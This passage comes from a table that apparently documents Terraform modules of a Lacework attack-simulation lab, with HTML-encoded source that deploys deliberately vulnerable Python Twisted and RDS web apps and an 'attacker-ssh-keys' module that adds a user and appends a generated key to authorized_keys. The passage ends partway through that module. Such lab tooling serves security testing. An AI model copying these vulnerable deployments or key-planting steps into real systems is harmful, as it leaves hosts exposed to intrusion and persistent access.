&&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;curl nodejs npm&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;curl nodejs npm&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    index&&#35;95;js&&#35;95;base64 = templatefile&&#35;40;<br/>                &quot;$&&#35;123;path&#46;module&&#35;125;/resources/index&#46;js&quot;,<br/>                &&#35;123;<br/>                    listen&&#35;95;port = var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;<br/>                &&#35;125;&&#35;41;<br/>    <br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| target-vulnerable-python3-twisted-app                                      | ./modules/ssm/deploy-python3-twisted-app                       | ssm_deploy_python3_twisted_app             | context.aws.ssm.vulnerable.python3_twisted_app                            | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "vulnerable": {<br/>                    "python3_twisted_app": {<br/>                        "enabled": false,<br/>                        "listen_port": 8090<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-python3-twisted-app                       | <pre>locals &&#35;123;<br/>    listen&&#35;95;port=var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;<br/>    payload = &lt;&lt;&#45;EOT<br/>    screen &#45;S vuln&&#35;95;python3&&#35;95;twisted&&#35;95;app&&#35;95;target &#45;X quit<br/>    screen &#45;wipe<br/>    truncate &#45;s 0 /tmp/vuln&&#35;95;python3&&#35;95;twisted&&#35;95;app&&#35;95;target&#46;log<br/>    if command &#45;v $PACKAGE&&#35;95;MANAGER &amp;&amp; $PACKAGE&&#35;95;MANAGER list &#124; grep &quot;python3&#45;twisted&quot; &#124; grep &quot;18&#46;9&#46;0&#45;11ubuntu0&#46;20&#46;04&quot;; then<br/>        mkdir &#45;p /vuln&&#35;95;python3&&#35;95;twisted&&#35;95;app<br/>        cd /vuln&&#35;95;python3&&#35;95;twisted&&#35;95;app<br/>        echo $&&#35;123;base64gzip&&#35;40;local&#46;app&&#35;95;py&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; app&#46;py<br/>        echo $&&#35;123;base64gzip&&#35;40;local&#46;requirements&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; requirements&#46;txt<br/>        log &quot;installing requirements&#46;&#46;&#46;&quot;<br/>        python3 &#45;m pip install &#45;r requirements&#46;txt &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        log &quot;requirements installed&quot;<br/>        <br/>        START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>        while true; do<br/>            log &quot;starting app&quot;<br/>            screen &#45;S vuln&&#35;95;python3&&#35;95;twisted&&#35;95;app&&#35;95;target &#45;X quit<br/>            screen &#45;wipe<br/>            screen &#45;d &#45;L &#45;Logfile /tmp/vuln&&#35;95;python3&&#35;95;twisted&&#35;95;app&&#35;95;target&#46;log &#45;S vuln&&#35;95;python3&&#35;95;twisted&&#35;95;app&&#35;95;target &#45;m python3 /vuln&&#35;95;python3&&#35;95;twisted&&#35;95;app/app&#46;py<br/>            screen &#45;S vuln&&#35;95;python3&&#35;95;twisted&&#35;95;app&&#35;95;target &#45;X colon &quot;logfile flush 0^M&quot;<br/>            sleep 30<br/>            log &quot;check app url&#46;&#46;&#46;&quot;<br/>            while &#33; curl &#45;sv http://localhost:$&&#35;123;var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;&&#35;125; &#124; tee &#45;a $LOGFILE; do<br/>                log &quot;failed to connect to app url http://localhost:$&&#35;123;var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;&&#35;125; &#45; retrying&quot;<br/>                sleep 60<br/>            done<br/>            log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>            sleep 1800<br/>            if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>                log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>                rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>                break<br/>            else<br/>                log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>            fi<br/>        done<br/>    else<br/>        log &quot;python twisted vulnerability required the following package installed:&quot;<br/>        log &quot;python3&#45;twisted/focal&#45;updates,focal&#45;security,now 18&#46;9&#46;0&#45;11ubuntu0&#46;20&#46;04&#46;1&quot;<br/>    fi<br/>    log &quot;done&quot;<br/>    EOT<br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;curl python3&#45;pip&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;curl python3&#45;pip&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    app&&#35;95;py = templatefile&&#35;40;<br/>                &quot;$&&#35;123;path&#46;module&&#35;125;/resources/app&#46;py&quot;,<br/>                &&#35;123;<br/>                    listen&&#35;95;port = var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;<br/>                &&#35;125;&&#35;41;<br/>    requirements = templatefile&&#35;40;<br/>                &quot;$&&#35;123;path&#46;module&&#35;125;/resources/requirements&#46;txt&quot;,<br/>                &&#35;123;<br/>                &&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| target-vulnerable-rds-app                                                  | ./modules/ssm/deploy-rds-app                                   | ssm_deploy_rds_app                         | context.aws.ssm.vulnerable.rds_app                                        | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "vulnerable": {<br/>                    "rds_app": {<br/>                        "enabled": false,<br/>                        "listen_port": 8091<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-rds-app                                   | <pre>locals &&#35;123;<br/>    listen&&#35;95;port=var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;<br/>    app&&#35;95;dirname = &quot;vuln&&#35;95;rdsapp&&#35;95;target&quot;<br/>    app&&#35;95;path = &quot;/$&&#35;123;local&#46;app&&#35;95;dirname&&#35;125;/app&#46;py&quot;<br/>    payload = &lt;&lt;&#45;EOT<br/>    screen &#45;S vuln&&#35;95;rdsapp&&#35;95;target &#45;X quit<br/>    screen &#45;wipe<br/>    truncate &#45;s 0 /tmp/vuln&&#35;95;rdsapp&&#35;95;target&#46;log<br/>    log &quot;removing previous app directory&quot;<br/>    rm &#45;rf /$&&#35;123;local&#46;app&&#35;95;dirname&&#35;125;<br/>    log &quot;building app directory&quot;<br/>    mkdir &#45;p /$&&#35;123;local&#46;app&&#35;95;dirname&&#35;125;/templates<br/>    cd /$&&#35;123;local&#46;app&&#35;95;dirname&&#35;125;<br/>    <br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;app&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; app&#46;py<br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;requirements&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; requirements&#46;txt<br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;test&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; test&#46;py<br/>    curl &#45;LOJ https://s3&#46;amazonaws&#46;com/rds&#45;downloads/rds&#45;combined&#45;ca&#45;bundle&#46;pem<br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;database&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; bootstrap&#46;sql<br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;entrypoint&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; entrypoint&#46;sh<br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;index&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; templates/index&#46;html<br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;cast&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; templates/cast&#46;html<br/><br/>    log &quot;updating entrypoing permissions&quot;<br/>    chmod 755 entrypoint&#46;sh<br/><br/>    log &quot;installing requirements&#46;&#46;&#46;&quot;<br/>    python3 &#45;m pip install &#45;r requirements&#46;txt &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>    log &quot;requirements installed&quot;<br/>    <br/>    log &quot;running mysql boostrap&#46;&#46;&#46;&quot;<br/>    mysql &#45;&#45;ssl&#45;ca=rds&#45;combined&#45;ca&#45;bundle&#46;pem &#45;&#45;ssl&#45;mode=REQUIRED &#45;h $&&#35;123;split&&#35;40;&quot;:&quot;, var&#46;inputs&&#35;91;&quot;db&&#35;95;host&quot;&&#35;93;&&#35;41;&&#35;91;0&&#35;93;&&#35;125; &#45;u$&&#35;123;var&#46;inputs&&#35;91;&quot;db&&#35;95;user&quot;&&#35;93;&&#35;125; &#45;p$&&#35;123;var&#46;inputs&&#35;91;&quot;db&&#35;95;password&quot;&&#35;93;&&#35;125; &lt; bootstrap&#46;sql<br/>    log &quot;mysql boostrap complete&quot;<br/><br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        log &quot;starting app&quot;<br/>        screen &#45;S $&&#35;123;local&#46;app&&#35;95;dirname&&#35;125; &#45;X quit<br/>        screen &#45;wipe<br/>        screen &#45;d &#45;L &#45;Logfile /tmp/$&&#35;123;local&#46;app&&#35;95;dirname&&#35;125;&#46;log &#45;S $&&#35;123;local&#46;app&&#35;95;dirname&&#35;125; &#45;m /$&&#35;123;local&#46;app&&#35;95;dirname&&#35;125;/entrypoint&#46;sh<br/>        screen &#45;S $&&#35;123;local&#46;app&&#35;95;dirname&&#35;125; &#45;X colon &quot;logfile flush 0^M&quot;<br/>        sleep 30<br/>        log &quot;check app url&#46;&#46;&#46;&quot;<br/>        while &#33; curl &#45;sv http://localhost:$&&#35;123;var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;&&#35;125;/cast &#124; tee &#45;a $LOGFILE; do<br/>            log &quot;failed to connect to app url http://localhost:$&&#35;123;var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;&&#35;125;/cast &#45; retrying&quot;<br/>            sleep 60<br/>        done<br/>        log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>        sleep 1800<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>        fi<br/>    done<br/>    EOT<br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;curl python3&#45;pip mysql&#45;client&#45;core&#45;8&#46;0&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;curl python3&#45;pip mysql&#45;shell&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    app = templatefile&&#35;40;<br/>                            &quot;$&&#35;123;path&#46;module&&#35;125;/resources/app&#46;py&#46;tpl&quot;,<br/>                            &&#35;123;<br/>                                region = var&#46;inputs&&#35;91;&quot;db&&#35;95;region&quot;&&#35;93;<br/>                            &&#35;125;<br/>                        &&#35;41;<br/>    test = templatefile&&#35;40;<br/>                          &quot;$&&#35;123;path&#46;module&&#35;125;/resources/test&#46;py&#46;tpl&quot;,<br/>                            &&#35;123;<br/>                                region = var&#46;inputs&&#35;91;&quot;db&&#35;95;region&quot;&&#35;93;<br/>                            &&#35;125;<br/>                        &&#35;41;<br/>    requirements = templatefile&&#35;40;<br/>                          &quot;$&&#35;123;path&#46;module&&#35;125;/resources/requirements&#46;txt&quot;,<br/>                          &&#35;123;&&#35;125;<br/>                        &&#35;41;<br/>    database = templatefile&&#35;40;<br/>                          &quot;$&&#35;123;path&#46;module&&#35;125;/resources/bootstrap&#46;sql&#46;tpl&quot;,<br/>                            &&#35;123;<br/>                                db&&#35;95;user = var&#46;inputs&&#35;91;&quot;db&&#35;95;user&quot;&&#35;93;<br/>                                db&&#35;95;name = var&#46;inputs&&#35;91;&quot;db&&#35;95;name&quot;&&#35;93;<br/>                            &&#35;125;<br/>                        &&#35;41;<br/>    entrypoint = templatefile&&#35;40;<br/>                            &quot;$&&#35;123;path&#46;module&&#35;125;/resources/entrypoint&#46;sh&#46;tpl&quot;,<br/>                            &&#35;123;<br/>                                 listen&&#35;95;port = var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;<br/>                                 app&&#35;95;path = local&#46;app&&#35;95;path<br/>                            &&#35;125;<br/>                        &&#35;41;<br/>    index = file&&#35;40;<br/>                            &quot;$&&#35;123;path&#46;module&&#35;125;/resources/index&#46;html&quot;<br/>                        &&#35;41;<br/>    cast = file&&#35;40;<br/>                            &quot;$&&#35;123;path&#46;module&&#35;125;/resources/cast&#46;html&quot;<br/>                        &&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| attacker-ssh-keys                                                          | ./modules/ssm/deploy-ssh-keys                                  | ssm_deploy_secret_ssh_public               | context.aws.ssm.ssh_keys                                                  | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "ssh_keys": {<br/>                    "enabled": false,<br/>                    "ssh_authorized_keys_path": "/home/sshuser/.ssh/authorized_keys",<br/>                    "ssh_private_key_path": "/home/sshuser/.ssh/secret_key",<br/>                    "ssh_public_key_path": "/home/sshuser/.ssh/secret_key.pub"<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-ssh-keys                                  | <pre>&#35; ssh key<br/>resource &quot;tls&&#35;95;private&&#35;95;key&quot; &quot;ssh&quot; &&#35;123;<br/>  algorithm = &quot;RSA&quot;<br/>  rsa&&#35;95;bits  = &quot;4096&quot;<br/>&&#35;125;<br/><br/>locals &&#35;123;<br/>    ssh&&#35;95;private&&#35;95;key = base64encode&&#35;40;tls&&#35;95;private&&#35;95;key&#46;ssh&#46;private&&#35;95;key&&#35;95;pem&&#35;41;<br/>    ssh&&#35;95;private&&#35;95;key&&#35;95;path = var&#46;inputs&&#35;91;&quot;ssh&&#35;95;private&&#35;95;key&&#35;95;path&quot;&&#35;93;<br/>    ssh&&#35;95;public&&#35;95;key = base64encode&&#35;40;chomp&&#35;40;tls&&#35;95;private&&#35;95;key&#46;ssh&#46;public&&#35;95;key&&#35;95;openssh&&#35;41;&&#35;41;<br/>    ssh&&#35;95;public&&#35;95;key&&#35;95;path = var&#46;inputs&&#35;91;&quot;ssh&&#35;95;public&&#35;95;key&&#35;95;path&quot;&&#35;93;<br/>    ssh&&#35;95;authorized&&#35;95;keys&&#35;95;path = var&#46;inputs&&#35;91;&quot;ssh&&#35;95;authorized&&#35;95;keys&&#35;95;path&quot;&&#35;93;<br/>    public&&#35;95;key&&#35;95;user = split&&#35;40;&quot;/&quot;, local&#46;ssh&&#35;95;public&&#35;95;key&&#35;95;path&&#35;41;&&#35;91;1&&#35;93; == &quot;root&quot; ? &quot;root&quot; : split&&#35;40;&quot;/&quot;, local&#46;ssh&&#35;95;public&&#35;95;key&&#35;95;path&&#35;41;&&#35;91;2&&#35;93;<br/>    private&&#35;95;key&&#35;95;user = split&&#35;40;&quot;/&quot;, local&#46;ssh&&#35;95;private&&#35;95;key&&#35;95;path&&#35;41;&&#35;91;1&&#35;93; == &quot;root&quot; ? &quot;root&quot; : split&&#35;40;&quot;/&quot;, local&#46;ssh&&#35;95;private&&#35;95;key&&#35;95;path&&#35;41;&&#35;91;2&&#35;93;<br/><br/>    payload&&#35;95;public = &lt;&lt;&#45;EOT<br/>    log &quot;starting script&quot;<br/>    log &quot;creating public key: $&&#35;123;local&#46;ssh&&#35;95;public&&#35;95;key&&#35;95;path&&#35;125;&quot;<br/>    log &quot;adding user: $&&#35;123;local&#46;public&&#35;95;key&&#35;95;user&&#35;125;&#46;&#46;&#46;&quot;<br/>    adduser &#45;&#45;gecos &quot;&quot; &#45;&#45;disabled&#45;password &quot;$&&#35;123;local&#46;public&&#35;95;key&&#35;95;user&&#35;125;&quot; &#124;&#124; log &quot;$&&#35;123;local&#46;public&&#35;95;key&&#35;95;user&&#35;125; user already exists&quot;<br/>    mkdir &#45;p $&&#35;123;dirname&&#35;40;local&#46;ssh&&#35;95;public&&#35;95;key&&#35;95;path&&#35;41;&&#35;125;<br/>    chown &#45;R $&&#35;123;local&#46;public&&#35;95;key&&#35;95;user&&#35;125;:$&&#35;123;local&#46;public&&#35;95;key&&#35;95;user&&#35;125; $&&#35;123;dirname&&#35;40;local&#46;ssh&&#35;95;public&&#35;95;key&&#35;95;path&&#35;41;&&#35;125;<br/>    echo &&#35;x27;$&&#35;123;base64decode&&#35;40;local&#46;ssh&&#35;95;public&&#35;95;key&&#35;41;&&#35;125;&&#35;x27; &gt; $&&#35;123;local&#46;ssh&&#35;95;public&&#35;95;key&&#35;95;path&&#35;125;<br/>    echo &&#35;x27;$&&#35;123;base64decode&&#35;40;local&#46;ssh&&#35;95;public&&#35;95;key&&#35;41;&&#35;125;&&#35;x27; &gt;&gt; $&&#35;123;local&#46;ssh&&#35;95;authorized&&#35;95;keys&&#35;95;path&&#35;125;<br/>    sort $&&#35;123;local&#46;ssh&&#35;95;authorized&&#35;95;keys&&#35;95;path&&#35;125; &#124; uniq &gt; $&&#35;123;local&#46;ssh&&#35;95;authorized&&#35;95;keys&&#35;95;path&&#35;125;&#46;uniq<br/>    mv $&&#35;123;local&#46;ssh&&#35;95;authorized&&#35;95;keys&&#35;95;path&&#35;125;&#46;uniq $&&#35;123;local&#46;ssh&&#35;95;authorized&&#35;95;keys&&#35;95;path&&#35;125;<br/>    chmod 600 $&&#35;123;local&#46;ssh&&#35;95;public&&#35;95;key&&#35;95;path&&#35;125; $&&#35;123;local&#46;ssh&&#35;95;authorized&&#35;95;keys&&#35;95;path&&#35;125;<br/>    chown &#45;R $&&#35;123;local&#46;public&&#35;95;key&&#35;95;user&&#35;125;:$&&#35;123;local&#46;public&&#35;95;key&&#35;95;user&&#35;125; $&&#35;123;local&#46;ssh&&#35;95;public&&#35;95;key&&#35;95;path&&#35;125; $&&#35;123;local&#46;ssh&&#35;95;authorized&&#35;95;keys&&#35;95;path&&#35;125;<br/>    log &quot;public key: $&&#35;40;ls &#45;l $&&#35;123;local&#46;ssh&&#35;95;public&&#35;95;key&&#35;95;path&&#35;125;&&#35;41;&quot;<br/>    log &quot;authorized key: $&&#35;40;ls &#45;l $&&#35;123;local&#46;ssh&&#35;95;authorized&&#35;95;keys&&#35;95;path&&#35;125;&&#35;41;&quot;<br/>    log &quot;done&quot;<br/>    EOT<br/>    base64&&#35;95;payload&&#35;95;public = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;public&&#35;95;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload&&#35;95;public<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    payload&&#35;95;private = &lt;&lt;&#45;EOT<br/>    log &quot;starting script&quot;<br/>    log &quot;creating private key: $&&#35;123;local&#46;ssh&&#35;95;private&&#35;95;key&&#35;95;path&&#35;125;&quot;<br/>    log &quot;adding user: 